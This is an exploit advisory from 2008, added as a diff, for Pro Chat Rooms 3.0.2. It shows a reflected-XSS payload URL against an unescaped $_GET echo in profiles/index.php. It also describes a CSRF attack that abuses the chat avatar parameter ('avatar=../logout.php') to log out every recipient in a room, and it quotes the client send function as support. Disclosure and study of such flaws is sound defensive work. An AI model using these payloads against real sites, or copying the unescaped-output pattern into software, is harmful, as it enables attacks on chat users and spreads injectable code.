@@ -1,0 +1,96 @@
+#########################################################################
+Pro Chat Rooms Version 3.0.2  (XSS/CSRF) Vulnerabilties
+#########################################################################
+ 
+ 
+## AUTHOR : ZynbER
+## MAiL   : ZynbER[at]Gmail[dot]com
+## HOME   : NoWhere
+ 
+ 
+## Script WebSite : http://www.prochatrooms.com
+ 
+## Version : Pro Chat Rooms Version 3.0.2
+ 
+ 
+## EXPLOITS :
+ 
+-==XSS==-
+ 
+http://www.yoursite.com/[path]/profiles/index.php?gud=XSSED
+ 
+Vulnerable code in "/profiles/index.php"
+ 
+ 
+<b><?php echo C_PRO2;?>: <?php echo $_GET['gud'];?></b>
+ 
+ 
+-==CSRF==-
+ 
+When a user sends a message in public room or in pm to onther user ; there is a parameter
+to set an avatar (ex:"image.gif"); we will exploit this param to run a CSRF when user get our message
+ 
+The JS sending function; here u can see all params needed to POST a message to user/room
+ 
+//Add a message to the chat server.
+function sendChatText() {
+ 
+if(!document.getElementById('txt_message').value) {
+   alert("You have not entered a message ");
+   return;
+}
+    if(document.getElementById('whisper').value.toLowerCase() == document.getElementById('thisuser').value.toLowerCase()) {
+    alert("You cannot whisper to yourself! ");
+    return;
+}
+if (sendReq.readyState == 4 || sendReq.readyState == 0) {
+    sendReq.open("POST", 'sendData.php?chat=1&last=' + lastMessage + '&room=' + room, true);
+    sendReq.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    sendReq.onreadystatechange = handleSendChat;  
+    var param = 'message=' + document.getElementById('txt_message').value;
+    param += '&name=' + chat_user;
+    param += '&nid=' + chat_userid;
+    param += '&chat=1';
+    param += '&room=' + room;
+    param += '&whisper=' + document.getElementById('whisper').value;
+    param += '&fontface=' + document.getElementById('font_face').value;
+    param += '&fontcolor=' + document.getElementById('font_color').value;
+    param += '&fontheight=' + document.getElementById('font_height').value;
+    param += '&fontstyle=' + document.getElementById('font_style').value;
+    param += '&avatar=' + document.getElementById('user_avatar').value;
+    sendReq.send(param);
+    document.getElementById('txt_message').value = '';
+    }                            
+}
+ 
+ 
+Exploit Example:
+ 
+default  ==> http://www.yoursite.com/[path]/Avatars/online.gif
+ 
+ 
+Your mallecious CSRF param;  avatar=../logout.php ==> New avatar path http://www.yoursite.com/[path]/logout.php
+ 
+ 
+in this example the user will logout when he recieves ur message; in a public room all users will
+be loged out from the room ;)
+ 
+ 
+ 
+ 
+## Note:  
+ 
+This infos are for educational purpose only;  
+I'm not responsable for any damage caused...
+ 
+ 
+ 
+## GREETZ  :  Str0ke - 7issa - Zakhm0ki - samIR - Chicha - Sn@k-baraka
+ 
+        -=== Marequin est fière de l'être ===-
+ 
+#########################################################################
+Pro Chat Rooms Version 3.0.2   (XSS/CSRF) Vulnerabilties
+#########################################################################
+
+# milw0rm.com [2008-12-10]
